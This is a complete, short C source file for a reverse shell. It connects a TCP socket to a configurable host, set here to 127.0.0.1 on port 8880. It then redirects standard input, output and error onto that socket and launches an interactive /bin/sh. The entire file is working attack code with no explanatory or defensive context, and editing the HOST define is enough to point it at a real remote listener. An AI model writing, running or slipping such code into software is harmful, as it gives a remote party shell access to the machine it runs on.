#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#define HOST "127.0.0.1"
#define PORT 8880
 
int main (int argc, char **argv)
{
  int scktd;
  struct sockaddr_in client;
 
  client.sin_family = AF_INET;
  client.sin_addr.s_addr = inet_addr(HOST);
  client.sin_port = htons(PORT);

  scktd = socket(AF_INET,SOCK_STREAM,0);
  connect(scktd,(struct sockaddr *)&client,sizeof(client));

  dup2(scktd,0); // STDIN
  dup2(scktd,1); // STDOUT
  dup2(scktd,2); // STDERR

  execl("/bin/sh","sh","-i",NULL,NULL);

  return 0;
}